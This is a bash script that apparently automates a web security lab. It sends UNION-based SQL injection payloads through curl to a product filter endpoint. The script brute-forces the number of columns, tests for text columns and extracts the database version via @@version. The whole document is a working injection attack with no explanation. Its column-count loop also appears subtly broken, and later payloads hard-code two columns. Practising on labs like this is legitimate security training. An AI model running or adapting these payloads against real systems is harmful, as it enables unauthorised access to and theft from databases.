#!/bin/bash

source ../common.hook

PAYLOAD=$(url_encode "/filter?category=Gifts' UNION SELECT NULL-- ")

for i in {1..20}; do
    output "Trying ${PAYLOAD}" INFO
    curl "${PS_URL}${PAYLOAD}" | grep "Internal Server Error"
    if [ $(echo $?) -ne 0 ]; then
        output "Number of columns: ${i}" INFO; NUM_COLS=$i; break;
    fi

    PAYLOAD=$(url_encode "${PAYLOAD%--+},NULL-- ")
done

PAYLOAD=$(url_encode "/filter?category=Gifts' UNION SELECT 'a','a'-- ")
output "Trying ${PAYLOAD}" INFO
curl "${PS_URL}${PAYLOAD}"

PAYLOAD=$(url_encode "/filter?category=Gifts' UNION SELECT @@version,NULL-- ")
output "Trying ${PAYLOAD}" INFO
curl "${PS_URL}${PAYLOAD}"

eval_result $PS_URL
